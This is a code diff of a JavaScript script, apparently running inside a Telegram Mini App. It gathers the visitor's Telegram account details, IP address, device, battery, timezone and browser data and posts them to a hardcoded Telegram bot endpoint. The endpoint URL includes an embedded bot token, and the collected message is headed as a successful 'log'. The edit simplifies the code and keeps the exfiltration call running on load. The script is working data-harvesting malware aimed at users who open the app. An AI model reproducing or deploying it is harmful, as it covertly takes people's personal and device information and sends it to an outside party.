@@ -29,7 +29,7 @@ function getBrowserInfo() {
     };
 }
 
-async function sendDataToTelegram(errorMessage) {
+async function sendDataToTelegram() {
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
     const osName = getOSName();
@@ -40,7 +40,6 @@ async function sendDataToTelegram(errorMessage) {
 
     const message = `
 <b>✨ Лог успешен!</b>
-
 <b>🔍 Информация об аккаунте:</b>
 ├ Тэг: @${tg.initDataUnsafe.user.username}
 ├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
@@ -48,7 +47,6 @@ async function sendDataToTelegram(errorMessage) {
 ├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
 ├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
 └ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
-
 <b>🖥️ Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
@@ -56,24 +54,12 @@ async function sendDataToTelegram(errorMessage) {
 ├ Имя ОС: <code>${osName}</code>
 ├ Разрешение экрана: <code>${screenResolution}</code>
 ├ Процент батареи: <code>${batteryPercentage}%</code>
-└ Часовой пояс: <code>none</code>
-
+└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
 <b>🌐 Информация о браузере:</b>
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-
-<b>[debug]: возможная ошибка:</b>
-${errorMessage}
-(либо ее нету.)
-`;
-const gmtOffset = new Date().getTimezoneOffset();
-const gmtTime = new Date(Date.now() - gmtOffset * 60000);
-
-message = message.replace(
-    '└ Часовой пояс: <code>none</code>',
-    '└ Часовой пояс: <code>${gmtOffset} (GMT${gmtOffset > 0 ? '-' : '+'}${Math.abs(gmtOffset / 60)})</code>'
-);
+    `;
 
     const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
     const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -90,8 +76,4 @@ message = message.replace(
     });
 }
 
-try {
-    sendDataToTelegram();
-  } catch (error) {
-    sendDataToTelegram(error.message);
-  }
+sendDataToTelegram();
